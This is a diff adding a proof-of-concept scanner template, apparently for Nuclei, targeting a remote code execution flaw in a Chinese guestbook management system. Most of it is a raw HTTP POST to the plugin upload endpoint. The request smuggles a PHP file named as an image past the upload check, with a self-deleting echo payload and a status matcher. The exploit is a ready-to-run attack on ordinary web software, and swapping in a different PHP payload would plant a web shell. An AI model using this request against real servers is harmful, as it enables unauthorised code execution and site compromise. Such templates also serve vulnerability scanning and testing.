@@ -1,0 +1,74 @@
+id: poc-kigih985n6dedkky
+info:
+  name: 亿渡留言管理系统 RCE
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kigih985n6dedkky'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kigih985n6dedkky
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /plugins/upload/uploadimg.php?fp=upimg HTTP/1.1
+
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypvPqblfrUine6bl3
+
+
+    X-Requested-With: XMLHttpRequest
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Cookie: userid=1; PHPSESSID=ov8kb5g3n4gng3lfskbnpbch37; Hm_lvt_448f02fca78a892e6d9c5f1c599ff906=1711623626; Hm_lpvt_448f02fca78a892e6d9c5f1c599ff906=1711623626
+
+
+    Connection: close
+
+
+
+
+    ------WebKitFormBoundarypvPqblfrUine6bl3
+
+
+    Content-Disposition: form-data; name="file"; filename="dudesite.php"
+
+
+    Content-Type: image/jpeg
+
+
+
+
+    <?php echo "12321";unlink(__FILE__); ?>
+
+
+    ------WebKitFormBoundarypvPqblfrUine6bl3--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?code)(?=.*?0).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
